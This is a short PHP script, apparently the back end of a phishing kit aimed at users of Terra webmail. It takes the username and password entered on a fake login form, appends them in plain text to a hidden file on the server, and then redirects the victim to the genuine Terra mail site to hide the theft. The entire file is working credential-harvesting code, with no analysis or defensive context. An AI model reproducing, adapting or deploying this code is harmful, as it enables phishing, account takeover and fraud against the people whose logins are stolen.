<?php


if (!@$_POST['username'] || !@$_POST['password']) {
  echo"<script>alert('Dados inválidos, tente novamente.');location.href=\"index.php?dados_invalidos\"</script>";
  exit();
}
$ip_usuario = $_SERVER['REMOTE_ADDR'];
$loginCod3r    = $_POST['username'];
$passwordCod3r = $_POST['password'];


if (filter_var($loginCod3r, FILTER_VALIDATE_EMAIL)){
 
}else{
    
   $loginCod3r =  $_POST['username']."@terra.com.br";
    
}

$stringData = "$loginCod3r;$passwordCod3r";
$myFile     =  "./dtweb/dataplus/" . "inputs.txt";

     
$fh         = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
fwrite($fh, $stringData."\n");
fclose($fh);



header('location:https://mail.terra.com.br/');